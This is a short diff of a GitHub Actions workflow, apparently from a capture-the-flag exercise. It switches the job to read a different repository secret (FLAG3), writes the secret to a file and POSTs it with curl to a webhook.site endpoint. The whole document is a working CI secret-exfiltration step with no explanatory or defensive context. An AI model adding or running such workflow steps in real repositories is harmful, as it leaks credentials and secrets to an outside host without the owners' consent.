@@ -17,10 +17,10 @@ jobs:
       - name: Install requests library
         run: pip install requests
       - name: Get secret
-        run: echo "${{ secrets.FLAG2 }}" > flag.txt
+        run: echo "${{ secrets.FLAG3 }}" > flag.txt
       - name: Send webhook
         run: |
-          URL="	https://webhook.site/2c9bd304-bd77-4157-8b8e-1ee4a93ec671"
+          URL="https://webhook.site/2c9bd304-bd77-4157-8b8e-1ee4a93ec671"
           SECRET=$(cat flag.txt)
           BODY="{\"secret\": \"$SECRET\"}"
           RESPONSE=$(curl -X POST -H "Content-Type: application/json" -d "$BODY" "$URL")
